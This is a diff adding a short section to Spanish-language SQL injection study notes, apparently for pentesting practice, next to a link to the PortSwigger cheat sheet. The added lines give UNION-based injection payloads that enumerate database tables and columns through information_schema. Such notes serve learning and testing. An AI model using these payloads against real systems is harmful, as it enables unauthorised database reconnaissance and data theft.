@@ -96,3 +96,13 @@ Hay veces  que el número de columnas o el tipo de estas, en las clausulas SELEC
 ```
 Cheat Sheet Portswigger:
 https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+Para explorar la estructura de Bases de datos: ver qué tablas hay, sus columnas, etc...:
+```
+select TABLE_SCHEMA, TABLE_NAME from information_schema.tables;
+2' UNION SELECT null, column_name from information_schema.columns WHERE table_name = 'users' -- -
+
+
+999' UNION select null, concat(information_Schema.tables.table_schema,'-->',information_Schema.columns.table_name), information_Schema.columns.column_name FROM information_Schema.columns, information_Schema.tables WHERE information_Schema.tables.table_name = information_Schema.columns.table_name;#
+
+```
